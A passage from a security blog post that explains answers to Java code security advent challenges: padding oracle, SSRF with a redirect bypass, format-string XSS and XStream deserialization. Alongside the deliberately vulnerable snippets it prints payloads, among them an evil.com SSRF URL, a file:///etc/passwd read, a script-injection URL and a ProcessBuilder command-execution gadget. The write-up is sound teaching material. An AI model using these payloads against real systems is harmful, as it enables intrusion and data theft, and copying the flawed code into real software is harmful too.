<h3 id="challenge-21---snowman"><span class="mr-2">Challenge 21 - Snowman</span><a href="#challenge-21---snowman" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre>import javax.crypto.*;
import javax.crypto.spec.*;
import org.apache.commons.codec.binary.Hex;

public class Decrypter{

 @RequestMapping("/decrypt")
  public void decrypt(HttpServletResponse req, HttpServletResponse res) throws IOException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, NoSuchPaddingException, DecoderException, InvalidKeySpecException {

    // Payload to decrypt: 699c99a4f27a4e4c310d75586abe8d32a8fc21a1f9e400f22b1fec7b415de5a4
    byte[] cipher = Hex.decodeHex(req.getParameter("c"));
    byte[] salt = new byte[]{(byte)0x12,(byte)0x34,(byte)0x56,(byte)0x78,(byte)0x9a,(byte)0xbc,(byte)0xde};
    // Extract IV.
    byte[] iv = new byte[16];
    System.arraycopy(cipher, 0, iv, 0, iv.length);
    IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);

    byte[] encryptedBytes = new byte[cipher.length - 16];
    System.arraycopy(cipher, 16, encryptedBytes, 0, cipher.length - 16);
    SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
    // Of course the password is not known by the attacker - just for testing purposes
    KeySpec spec = new PBEKeySpec("SuperSecurePassword".toCharArray(), salt, 65536, 128);
    SecretKey key = factory.generateSecret(spec);
    SecretKeySpec secretKeySpec = new SecretKeySpec(key.getEncoded(), "AES");
    // Decrypt.
    try {
      Cipher cipherDecrypt = Cipher.getInstance("AES/CBC/PKCS5Padding");
      cipherDecrypt.init(Cipher.DECRYPT_MODE, secretKeySpec, ivParameterSpec);
      byte[] decrypted = cipherDecrypt.doFinal(encryptedBytes);
      // Do something.
    } catch (BadPaddingException e) {
      res.getWriter().println("Invalid Padding!!");
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">decrypt</code> method attempts to decrypt user-provided hex-encoded ciphertext using an insecure AES algorithm (line 27).</li>
  <li>The attacker knows the encrypted ciphertext (line 10) but not the encryption key.</li>
  <li>Since the ciphertext lacks Message Authentication Code (MAC) or signature protection, the attacker can manipulate the Initialization Vector (IV, first 16 bytes of ciphertext).</li>
  <li>This manipulation exploits CBC mode malleability to trigger a BadPaddingException.</li>
  <li>By leveraging a Padding Oracle attack, the attacker can decrypt the ciphertext without the key.</li>
  <li>This attack might require up to 16 * 256 requests to decrypt a single block.</li>
  <li>For more information on Padding Oracle attacks, refer to: <a href="https://www.owasp.org/images/e/eb/Fun_with_Padding_Oracles.pdf">https://www.owasp.org/images/e/eb/Fun_with_Padding_Oracles.pdf</a>.</li>
</ul>

<h3 id="challenge-22---fruitcake"><span class="mr-2">Challenge 22 - Fruitcake</span><a href="#challenge-22---fruitcake" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre>import org.apache.commons.io.IOUtils;
import java.net.*;
import javax.servlet.http.*;

public class ReadExternalUrl extends HttpServlet {

  private static URLConnection getUrl(String target) {
    try{
      // Don't allow redirects:
      HttpURLConnection.setFollowRedirects(false);

      URL url = new URL(target);
      if(!url.getProtocol().startsWith("http"))
        throw new Exception("Must start with http!.");

      InetAddress inetAddress = InetAddress.getByName(url.getHost());
      if (inetAddress.isAnyLocalAddress() || inetAddress.isLoopbackAddress() || inetAddress.isLinkLocalAddress())
        throw new Exception("No local urls allowed!");

      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
      return conn;
    }
    catch (Exception e) {
      return null;
    }
  }

  protected void doGet(HttpServletRequest request,
                       HttpServletResponse response) {
    try{
      URLConnection conn = getUrl(request.getParameter("url"));
      conn.connect();
      String redirect = conn.getHeaderField("Location");
      if(redirect != null) {
        URL url = new URL(redirect);
        if(redirect.indexOf("http://") == -1) {
          throw new Exception("No http found!");
        }
        if(getUrl(redirect.substring(redirect.indexOf("http://"))) != null) {
          conn = url.openConnection();
          conn.connect();
        }
      }
      // Output content of url
      IOUtils.copy(conn.getInputStream(),response.getOutputStream());
    }
    catch (Exception e) {
      System.exit(-1);
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The code retrieves a URL using the <code class="language-plaintext highlighter-rouge">getUrl</code> method (line 31).</li>
  <li>Initial checks ensure the URL starts with ‚Äúhttp‚Äù (line 13) and is a valid external URL (line 17).</li>
  <li>Redirects are also disabled (line 10).</li>
  <li>However, the code allows a single redirect via the ‚ÄúLocation‚Äù header (lines 33-43).</li>
  <li>An attacker can control the URL parameter and inject a malicious ‚ÄúLocation‚Äù header.</li>
  <li>A simple payload like <code class="language-plaintext highlighter-rouge">victim.org?url=http://evil.com/</code> can bypass the second check (line 39) due to incomplete validation.</li>
  <li>The check only examines the content after ‚Äúhttp‚Äù (e.g., ‚Äúgoogle.com‚Äù in this case).</li>
  <li>Though intended to fetch ‚Äúhttps://localhost/‚Äù, the request ends up at ‚Äúhttps://localhost/?x=<a href="http://google.com">http://google.com</a>‚Äù (line 40/41).</li>
  <li>The response body is printed (line 45), demonstrating a classic SSRF vulnerability.</li>
  <li>But there‚Äôs more! The attacker can also exploit this as a File Read vulnerability.</li>
  <li>By injecting <code class="language-plaintext highlighter-rouge">Location: file:///etc/passwd#http://google.com</code>, the code attempts to read the local ‚Äú/etc/passwd‚Äù file, potentially leaking sensitive information.</li>
</ul>

<h3 id="challenge-23---ivy"><span class="mr-2">Challenge 23 - Ivy</span><a href="#challenge-23---ivy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>import javax.servlet.http.*;
import java.io.*;
import java.text.*;
import java.util.*;
import org.apache.commons.lang3.StringEscapeUtils;

public class ShowCalendar extends HttpServlet {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    try {
      response.setContentType("text/html");
      GregorianCalendar calendar = new GregorianCalendar();
      SimpleTimeZone x = new SimpleTimeZone(0, request.getParameter("id"));
      SimpleDateFormat parser=new SimpleDateFormat("EEE MMM d HH:mm:ss zzz yyyy");
      calendar.setTime(parser.parse(request.getParameter("current_time")));
      calendar.setTimeZone(x);
      Formatter formatter = new Formatter();
      String name = StringEscapeUtils.escapeHtml4(request.getParameter("name"));
      formatter.format("Name of your calendar: " + name + " and your current date is: %1$te.%1$tm.%1$tY", calendar);
      PrintWriter pw = response.getWriter();
      pw.print(formatter.toString());
    } catch(ParseException e) {
      response.sendRedirect("/");
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li>This code is vulnerable to Reflective XSS due to a format string injection.</li>
  <li>User input for <code class="language-plaintext highlighter-rouge">name</code> is sanitized against XSS in line 17.</li>
  <li>However, the sanitized <code class="language-plaintext highlighter-rouge">name</code> is then concatenated into a format string in line 18.</li>
  <li>Since <code class="language-plaintext highlighter-rouge">calendar</code> is an object, various format specifiers can be used.</li>
  <li>The user can inject format specifiers without causing errors.</li>
  <li>The format specifier <code class="language-plaintext highlighter-rouge">%s</code> calls <code class="language-plaintext highlighter-rouge">toString()</code> on elements within the <code class="language-plaintext highlighter-rouge">Calendar</code> object.</li>
  <li>In line 12, a <code class="language-plaintext highlighter-rouge">SimpleTimeZone</code> object is created with user-controlled <code class="language-plaintext highlighter-rouge">id</code>.</li>
  <li>This <code class="language-plaintext highlighter-rouge">SimpleTimeZone</code> object is added to the <code class="language-plaintext highlighter-rouge">Calendar</code> object in line 15.</li>
  <li>An attacker can inject an XSS payload into <code class="language-plaintext highlighter-rouge">name</code> using the format specifier <code class="language-plaintext highlighter-rouge">%s</code>.</li>
  <li>The payload is then included in the formatted string printed in line 20.</li>
  <li>This results in a Reflective XSS vulnerability where the injected script is executed through reflection.</li>
</ul>

<p><strong>Example payload:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://victim.org/?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;current_time=Thu Jun 18 20:56:02 EDT 2009&amp;name=%shello
</pre></td></tr></tbody></table></code></div></div>

<h3 id="challenge-24---nutcracker"><span class="mr-2">Challenge 24 - Nutcracker</span><a href="#challenge-24---nutcracker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre>package com.rips.demo.web;
 
import java.io.*;
import java.lang.reflect.*;
 
class Invoker implements Serializable {
 
  private String c;
  private String m;
  private String[] a;
 
  public Invoker(String c, String m, String[] a) {
    this.c = c;
    this.m = m;
    this.a = a;
  }
 
  private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException {
    ois.defaultReadObject();
    Class clazz = Class.forName(this.c);
    Object obj = clazz.getConstructor(String[].class).newInstance(new Object[]{this.a});
    Method meth = clazz.getMethod(this.m);
    meth.invoke(obj, null);
  }
}
 
class User implements Serializable {
  private String name;
  private String email;
  transient private String password;
 
  public User(String name, String email, String password) {
    this.name = name;
    this.email = email;
    this.password = password;
  }
   
  private void readObject(ObjectInputStream stream)
      throws IOException, ClassNotFoundException {
    stream.defaultReadObject();
    password = (String) stream.readObject();
  }
 
  @Override
  public String toString() {
    return "User{" + "name='" + name + ", email='" + email + "'}";
  }
}
</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre> @RequestMapping(value = "/unserialize", consumes = "text/xml")
  public void unserialize(@RequestBody String xml, HttpServletResponse res) throws IOException, ParserConfigurationException, SAXException, XPathExpressionException, TransformerException {
    res.setContentType("text/plain");
    // Parse xml string
    DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
    builderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
    DocumentBuilder builder = builderFactory.newDocumentBuilder();
    Document xmlDocument = builder.parse(new InputSource(new StringReader(xml)));
    XPath xPath = XPathFactory.newInstance().newXPath();
    String expression = "//com.rips.demo.web.User[@serialization='custom'][1]";
    //only allow User objects to be unserialized!!!
    NodeList nodeList = (NodeList) xPath.compile(expression).evaluate(xmlDocument, XPathConstants.NODESET);
    // Transform node back to xml string
    Transformer transformer = TransformerFactory.newInstance().newTransformer();
    transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");
    StringWriter writer = new StringWriter();
    transformer.transform(new DOMSource(nodeList.item(0)), new StreamResult(writer));
    String xmloutput = writer.getBuffer().toString();
    // Unserialze User
    User user = (User) new XStream().fromXML(xmloutput);
    res.getWriter().print("Successfully unserialized "+user.toString());
  }
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>This code is vulnerable to Object Injection due to insecure deserialization.</li>
  <li>User input arrives through the <code class="language-plaintext highlighter-rouge">@RequestBody</code> annotation (Spring framework) and is mapped to <code class="language-plaintext highlighter-rouge">xml</code> in line 2.</li>
  <li>The input is parsed into a DOM document (line 8).</li>
  <li>An XPath expression filters for <code class="language-plaintext highlighter-rouge">com.rips.demo.web.User</code> nodes with the <code class="language-plaintext highlighter-rouge">serialization='custom'</code> attribute (lines 10-12).</li>
  <li>The filtered node is then serialized back to a string (line 17) and deserialized (line 20).</li>
  <li>Both relevant classes implement <code class="language-plaintext highlighter-rouge">Serializable</code> and override default deserialization (lines 18-24, 38-42).</li>
  <li>While deserialization reads non-transient fields, the <code class="language-plaintext highlighter-rouge">password</code> field is manually read later (line 41).</li>
  <li>This allows hiding another object within the User object, bypassing the filter.</li>
  <li>The vulnerability is exploited in the <code class="language-plaintext highlighter-rouge">readObject</code> method of the <code class="language-plaintext highlighter-rouge">Invoker</code> class (line 19).</li>
  <li>This method allows creating an arbitrary object and invoking its methods.</li>
  <li>An attacker can craft a payload to create a <code class="language-plaintext highlighter-rouge">ProcessBuilder</code> object and execute commands (lines shown).</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>&lt;com.rips.demo.web.User serialization="custom"&gt;
  &lt;com.rips.demo.web.User&gt;
    &lt;default&gt;
      &lt;email&gt;peter@gmail.com&lt;/email&gt;
      &lt;name&gt;Peter&lt;/name&gt;
    &lt;/default&gt;
    &lt;com.rips.demo.web.Invoker serialization="custom"&gt;
      &lt;com.rips.demo.web.Invoker&gt;
        &lt;default&gt;
          &lt;a&gt;
            &lt;string&gt;touch&lt;/string&gt;
            &lt;string&gt;abc&lt;/string&gt;
          &lt;/a&gt;
          &lt;c&gt;java.lang.ProcessBuilder&lt;/c&gt;
          &lt;m&gt;start&lt;/m&gt;
        &lt;/default&gt;
      &lt;/com.rips.demo.web.Invoker&gt;
    &lt;/com.rips.demo.web.Invoker&gt;
  &lt;/com.rips.demo.web.User&gt;
&lt;/com.rips.demo.web.User&gt;
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/capture-the-flag/'>capture the flag</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/ctf/"
          class="post-tag no-text-decoration" >ctf</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://x.com/snoopysecurity?lang=en-GB" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://x.com/snoopysecurity?lang=en-GB" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/in/sam-sanoop-b80535252/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recently Updated</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/avoiding-smtp-injection/">Avoiding SMTP Injection: A Whitebox primer</a></li>
      
        
        
        
      <li><a href="/posts/chef-unsafe-deserialization/">Chef Yaml Deserialization Vulnerability</a></li>
      
        
        
        
      <li><a href="/posts/code-security-advent-calendar-answers/">Code Security Advent Calendar 2020 Answers</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/ctf/">ctf</a>
    
      
      <a class="post-tag" href="/tags/php-deserialization/">php deserialization</a>
    
      
      <a class="post-tag" href="/tags/yaml/">yaml</a>
    
      
      <a class="post-tag" href="/tags/exploit-education/">exploit education</a>
    
      
      <a class="post-tag" href="/tags/facebook-ctf/">facebook ctf</a>
    
      
      <a class="post-tag" href="/tags/zip-slip/">zip slip</a>
    
      
      <a class="post-tag" href="/tags/code-security-advent-calendar/">code security advent calendar</a>
    
      
      <a class="post-tag" href="/tags/domgoat/">domgoat</a>
    
      
      <a class="post-tag" href="/tags/drozer/">drozer</a>
    
      
      <a class="post-tag" href="/tags/ghost-xss/">ghost xss</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/codesecurity-advent-calendar-2022/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1672601152"
    data-df="ll"
    >
  Jan  2, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SonarSource Advent Security Calendar 2022 Notes</h3>
            <div class="text-muted small">
              <p>
                





                Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2022. Official writeup here: https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/

Day 1 - PHP

1
2
3
4
5
6...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/ripstech_2017_security_calendar/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1521833152"
    data-df="ll"
    >
  Mar 24, 2018
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>RipsTech PHP Security Calendar 2017 Notes</h3>
            <div class="text-muted small">
              <p>
                





                Notes related to RipsTech PHP Security Calendar 2017 which aren‚Äôt accessible anymore.

Challenge 1 - Wishlist

class Challenge {
    const UPLOAD_DIRECTORY = &#39;./solutions/&#39;;
    private $file;
    ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/code-advent-2021-security-challenges/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1641065152"
    data-df="ll"
    >
  Jan  2, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SonarSource CodeAdvent Security Calendar 2021 Notes</h3>
            <div class="text-muted small">
              <p>
                





                Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2021.

Day 1




  
    Line 13: The code registers a handler for message events and writes the event‚Äôs data directly into the DOM...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/10_Exploit_Education_Nebula_Walkthrough/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Exploit Education - Nebula Walkthrough</p>
  </a>
  

  
  <a href="/posts/08_domgoat_solutions/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>DomGoat Walkthrough</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/ctf/">ctf</a>
    
      
      <a class="post-tag" href="/tags/php-deserialization/">php deserialization</a>
    
      
      <a class="post-tag" href="/tags/yaml/">yaml</a>
    
      
      <a class="post-tag" href="/tags/exploit-education/">exploit education</a>
    
      
      <a class="post-tag" href="/tags/facebook-ctf/">facebook ctf</a>
    
      
      <a class="post-tag" href="/tags/zip-slip/">zip slip</a>
    
      
      <a class="post-tag" href="/tags/code-security-advent-calendar/">code security advent calendar</a>
    
      
      <a class="post-tag" href="/tags/domgoat/">domgoat</a>
    
      
      <a class="post-tag" href="/tags/drozer/">drozer</a>
    
      
      <a class="post-tag" href="/tags/ghost-xss/">ghost xss</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          ¬© 2025
          <a href="https://twitter.com/snoopysecurity">Sam Sanoop</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
